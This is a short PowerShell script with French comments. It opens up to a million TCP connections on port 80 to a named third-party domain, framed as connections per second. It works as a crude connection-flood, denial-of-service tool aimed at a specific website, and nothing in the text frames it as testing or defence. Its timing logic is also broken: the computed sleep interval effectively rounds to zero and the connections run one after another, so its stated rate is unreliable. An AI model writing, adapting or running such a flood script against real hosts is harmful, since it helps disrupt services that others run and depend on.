$ipAddress = "tia-portfolio.com"
$port = 80
$timeout = 5000
$connectionsPerSecond = 1000000

$intervalMilliseconds = 1 / $connectionsPerSecond

for ($i = 1; $i -le $connectionsPerSecond; $i++) {
    $socket = New-Object System.Net.Sockets.TcpClient
    $connectResult = $socket.BeginConnect($ipAddress, $port, $null, $null)
    $connectSuccess = $connectResult.AsyncWaitHandle.WaitOne($timeout)

    if ($connectSuccess) {
        Write-Host "Connexion $i établie avec succès."
        # Effectuer des opérations supplémentaires sur la connexion ici
        $socket.Close()
    } else {
        Write-Host "Échec de la connexion $i."
    }

    # Attendre l'intervalle approprié avant de démarrer la prochaine connexion
    Start-Sleep -Milliseconds $intervalMilliseconds
}
